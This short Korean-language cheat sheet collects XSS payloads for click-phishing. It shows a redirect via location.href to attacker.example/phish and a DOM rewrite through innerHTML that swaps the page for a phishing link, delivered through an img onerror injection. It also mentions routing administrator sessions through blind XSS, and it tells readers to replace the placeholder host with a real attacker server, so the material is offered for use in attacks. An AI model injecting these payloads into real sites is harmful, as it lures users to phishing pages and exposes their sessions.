# XSS 클릭 유도 페이로드

- XSS 실행 후 `location.href` 전환과 DOM `innerHTML` 조작으로 사용자를 공격자 페이지로 유도하는 클릭 피싱 페이로드 모음
- 쿠키 탈취보다 피해자의 상호작용(링크 클릭, 가짜 페이지 유입)이 목표일 때, 블라인드 XSS로 관리자 세션을 공격자가 지정한 URL로 보낼 때
- 주입된 스크립트가 실제 사용자 브라우저에서 실행되어야 하고, 대상에서 공격자 페이지로의 이동이 차단되지 않아야 한다. `attacker.example`은 실제 공격자 주소로 교체한다

## 개요

`<img src=x onerror="...">` 형태의 XSS에서 사용자를 특정 링크로 유도하는 JavaScript 페이로드 모음이다. `attacker.example`는 실제 공격자 서버 주소로 바꿔 사용한다.

## 링크 클릭 유도

```js
alert('클릭하세요')
```

```js
location.href='http://attacker.example/phish'
```

```js
document.body.innerHTML='<a href="http://attacker.example/phish">클릭</a>'
```
